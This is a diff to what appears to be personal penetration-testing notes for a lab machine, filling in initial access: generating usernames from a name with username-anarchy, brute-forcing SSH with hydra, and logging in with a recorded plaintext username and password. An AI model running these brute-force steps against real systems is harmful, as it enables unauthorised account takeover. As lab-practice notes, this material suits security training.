@@ -2,12 +2,13 @@
 
 > **Target:** 10.129.234.116 | **OS:** Windows | **Difficulty:** Medium
 > ⚠️ IP changes on restart — confirm current IP before starting.
+> **Updated:** 2026-04-18 11:03 UTC+8
 
 ---
 
 ## Assessment Checklist
 
-- [ ] Foothold (initial access)
+- [x] Foothold (initial access) — SSH brute force
 - [ ] Local enumeration
 - [ ] Password attacks (local or remote)
 - [ ] Privilege escalation
@@ -27,12 +28,20 @@ nmap -sC -sV -Pn 10.129.234.116
 
 ## 2. Exploitation
 
-### Initial Access
+### Initial Access — SSH Brute Force
+
+**Victim:** Betty Jayde (Nexura LLC) — `jbetty / Texas123!@#`
 
 ```bash
-# Tool used:
-netexec winrm <ip> -u user -p password
-evil-winrm -i <ip> -u user -p password
+# Generate usernames from name
+echo "Betty Jayde" | ./username-anarchy -i /dev/stdin > usernames.txt
+
+# Brute force SSH (use single quotes for special chars: !$@#)
+hydra -L usernames.txt -p 'Texas123!@#' ssh://10.129.234.116 -t 4
+
+# Connect with valid credentials
+ssh jbetty@10.129.234.116
+# Password: Texas123!@#
 ```
 
 ---
